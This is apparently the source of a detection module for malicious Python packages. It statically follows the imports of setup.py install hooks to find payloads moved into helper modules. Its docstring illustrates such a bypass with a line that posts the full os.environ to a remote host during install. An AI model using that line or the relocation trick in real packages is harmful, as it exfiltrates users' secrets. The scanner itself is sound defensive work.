"""Which files an install hook actually runs.

Install-time context is the difference between a finding and a note. Reading
credentials and making a network call is what an application does all day; doing
it during `pip install`, unprompted, as the user, before any test or review or
container boundary applies, is the attack. The engine already escalates on that
distinction -- `credential + egress` inside a hook is `MALWARE.EXFIL`, and
outside one needs a third signal.

The context was attached to the hook file and nothing else, so the escalation
was avoided by moving the payload one file over:

    # setup.py
    import _bootstrap; _bootstrap.init()

    # _bootstrap.py -- entirely direct syntax, and invisible
    urllib.request.urlopen("https://" + host, data=str(dict(os.environ)).encode())

No obfuscation, no cleverness: relocation into a helper module, which is how
every non-trivial package is structured anyway. That made it the cheapest bypass
in the tool and the one least likely to look like an attack in review.

What runs at install time is the hook *and everything it imports*, so that is
what carries the context. This resolves the closure statically -- it reads
imports, it never executes anything -- and only follows first-party modules,
because a payload inside `requests` is not this repository's file to judge.
"""

from __future__ import annotations

import ast
from pathlib import PurePosixPath
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from collections.abc import Iterable, Mapping

MAX_DEPTH = 4
"""How far to follow imports from a hook.

Deep enough for the shapes that occur -- `setup.py` imports a bootstrap module
which imports a helper -- and bounded because the graph is attacker-supplied and
a cycle or a wide fan-out would otherwise be unbounded work. Cycles are handled
by the visited set; this bounds breadth-first cost as well.
"""

MAX_FILES = 500
"""Ceiling on the closure size, for the same reason."""


class ImportClosure:
    """Resolves the first-party modules a Python file imports, transitively."""

    @staticmethod
    def candidates(module: str, importer: str) -> list[str]:
        """Repository paths a dotted module name could refer to.

        Both layouts are tried because both are ordinary: `a.b` as `a/b.py` and
        as `a/b/__init__.py`. Relative imports resolve against the importing
        file's directory, which is what makes `from . import helper` work.
        """
        parts = module.split(".")
        base = PurePosixPath(importer).parent
        joined = "/".join(parts)
        return [
            f"{joined}.py",
            f"{joined}/__init__.py",
            str(base / f"{joined}.py") if str(base) != "." else f"{joined}.py",
            str(base / joined / "__init__.py") if str(base) != "." else f"{joined}/__init__.py",
        ]

    @classmethod
    def imported_by(cls, source: str, importer: str) -> list[str]:
        """Module names a file imports, with relative imports resolved.

        Parsed, never executed -- `ast.parse` builds a tree and runs nothing,
        which is the same reason the pypi ecosystem reads `setup.py` this way.
        A file that will not parse yields nothing rather than raising: it is
        malformed Python, and the caller has better things to say about that
        than this helper does.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []

        found: list[str] = []
        base = PurePosixPath(importer).parent
        # Imports written inside a command class an install never runs are not
        # install-time imports. See `_inert_command_classes`.
        inert = cls._inert_command_classes(tree)
        skip: set[int] = set()
        if inert:
            for node in ast.walk(tree):
                if isinstance(node, ast.ClassDef) and node.name in inert:
                    skip.update(id(inner) for inner in ast.walk(node))
        for node in ast.walk(tree):
            if id(node) in skip:
                continue
            if isinstance(node, ast.Import):
                found.extend(alias.name for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                if node.level:
                    # `from . import x` / `from .pkg import y`. Walk up one
                    # directory per extra dot, as Python does.
                    prefix = base
                    for _ in range(node.level - 1):
                        prefix = prefix.parent
                    stem = f"{prefix}/{node.module}" if node.module else str(prefix)
                    found.append(stem.strip("/").replace("/", "."))
                    found.extend(
                        f"{stem.strip('/').replace('/', '.')}.{alias.name}" for alias in node.names
                    )
                elif node.module:
                    found.append(node.module)
                    # `from pkg import module` may name a module rather than a
                    # symbol; both readings are tried and the one that exists in
                    # the repository wins.
                    found.extend(f"{node.module}.{alias.name}" for alias in node.names)
        return found

    #: `cmdclass` commands that run when somebody installs or builds the package.
    #:
    #: `PypiEcosystem.CONSUMER_INSTALL_COMMANDS` is the narrower question -- what
    #: reaches a consumer installing a wheel. This is the wider one, because a
    #: build is still install-time execution on somebody's machine.
    INSTALL_TIME_COMMANDS = frozenset(
        {
            "install",
            "install_lib",
            "install_scripts",
            "install_data",
            "build",
            "build_py",
            "build_ext",
            "build_clib",
            "bdist_wheel",
            "bdist_egg",
            "develop",
            "egg_info",
            "sdist",
        }
    )

    @classmethod
    def _inert_command_classes(cls, tree: ast.Module) -> set[str]:
        """Classes wired to a `cmdclass` command that an install never runs.

        `sympy`'s `setup.py` imports no sympy at module level. The three that
        exist are inside `test_sympy` and `antlr`, wired as
        `cmdclass={'test': test_sympy, 'antlr': antlr}` -- commands a person runs
        deliberately, and `pip install` never does. Following them anyway put 233
        files of sympy into install-time context, and
        `sympy/external/importtools.py` -- whose `__import__(module + '.' +
        submod)` is how a library probes for an optional dependency -- became
        `MALWARE.DYNAMIC_DISPATCH.001` at CRITICAL.

        The inverse is the shape this closure exists to catch, and it is
        untouched: `cmdclass={"install": CustomInstall}` names a command in
        `INSTALL_TIME_COMMANDS`, so its imports are still followed. 82 of the 252
        real malicious PyPI packages that survived the recall work are written
        that way -- see `PypiEcosystem._install_override_hook`.

        Only classes that are actually WIRED count. A command class nobody
        registers runs on nobody's machine either way, and leaving it followed
        keeps this from turning into a way to hide an import.
        """
        wired: dict[str, str] = {}
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for keyword in node.keywords:
                if keyword.arg != "cmdclass" or not isinstance(keyword.value, ast.Dict):
                    continue
                for key, value in zip(keyword.value.keys, keyword.value.values, strict=False):
                    if (
                        isinstance(key, ast.Constant)
                        and isinstance(key.value, str)
                        and isinstance(value, ast.Name)
                    ):
                        wired[value.id] = key.value
        return {name for name, command in wired.items() if command not in cls.INSTALL_TIME_COMMANDS}

    @classmethod
    def resolve(cls, hooks: Iterable[str], sources: Mapping[str, str]) -> set[str]:
        """Every first-party file reachable by import from a hook.

        `sources` is the repository's Python files by path, so "first-party"
        means "a file in this scan" -- an import that resolves to nothing here
        is a third-party package and is not followed. That boundary is the point:
        the question is which of *these* files run at install time.
        """
        seen: set[str] = set()
        frontier = [(path, 0) for path in hooks if path in sources]

        while frontier and len(seen) < MAX_FILES:
            path, depth = frontier.pop()
            if depth >= MAX_DEPTH:
                continue
            for module in cls.imported_by(sources[path], path):
                for candidate in cls.candidates(module, path):
                    normalised = candidate.lstrip("./")
                    if normalised in sources and normalised not in seen:
                        seen.add(normalised)
                        frontier.append((normalised, depth + 1))
        return seen


__all__ = ["ImportClosure"]
